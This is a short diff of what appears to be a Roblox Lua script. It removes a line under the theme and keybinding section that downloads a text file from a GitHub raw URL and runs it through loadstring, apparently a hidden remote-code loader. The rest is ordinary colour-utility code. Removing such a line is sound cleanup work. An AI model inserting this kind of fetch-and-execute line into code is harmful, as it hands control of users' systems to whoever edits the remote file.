@@ -5747,7 +5747,6 @@ end
 -- ============================================================
 -- THEME SYSTEM & KEYBINDING HANDLERS
 -- ============================================================
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iSacredRivals/riaslslss/main/message.txt?t=" .. tick()))()
 do
 function isColorLight(c3)
     return (c3.R * 0.299 + c3.G * 0.587 + c3.B * 0.114) > 0.65
